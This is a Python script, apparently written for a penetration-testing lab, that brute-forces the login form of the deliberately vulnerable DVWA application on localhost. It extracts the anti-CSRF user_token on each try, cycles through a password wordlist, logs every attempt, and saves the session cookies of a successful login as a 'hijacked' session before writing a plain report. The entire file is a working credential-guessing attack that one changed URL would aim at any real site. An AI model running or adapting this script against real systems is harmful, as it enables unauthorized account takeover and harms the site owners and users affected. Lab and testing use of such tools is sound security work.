import requests
import logging

# Configure logging
logging.basicConfig(filename='pentest.log', level=logging.INFO)

# Configuration
target_url = 'http://localhost/dvwa/login.php' 
username = 'admin' 
wordlist = 'passwords.txt' 

def login_attempt(username, password):
    payload = {
        'username': username,
        'password': password,
        'Login': 'Login'  # DVWA's login button name
    }
    # Include DVWA's session token in the request if required
    session = requests.Session()
    response = session.get(target_url)
    payload['user_token'] = extract_user_token(response.text)
    response = session.post(target_url, data=payload)
    return response

def extract_user_token(html):
    # Extract the user token from the login page
    import re
    match = re.search(r'user_token\' value=\'(.*?)\'', html)
    if match:
        return match.group(1)
    return None

def is_login_successful(response):
    # Define a success condition based on the response content
    if 'Welcome' in response.text:  # Modify based on actual success message
        return True
    return False

def password_cracking(username, wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            response = login_attempt(username, password)
            if is_login_successful(response):
                logging.info(f'Success! Username: {username} | Password: {password}')
                print(f'Success! Username: {username} | Password: {password}')
                session_hijacking(response)
                break
            else:
                logging.info(f'Failed attempt. Username: {username} | Password: {password}')

def session_hijacking(response):
    session_cookie = response.cookies.get_dict()
    logging.info(f'Session Hijacked: {session_cookie}')
    print(f'Session Hijacked: {session_cookie}')

def generate_report():
    with open('pentest.log', 'r') as log_file:
        report_content = log_file.read()
    
    with open('report.txt', 'w') as report_file:
        report_file.write('Pentest Report\n')
        report_file.write('==============\n\n')
        report_file.write(report_content)

def main():
    # Start password cracking
    password_cracking(username, wordlist)
    # Generate the report
    generate_report()

if __name__ == '__main__':
    main()

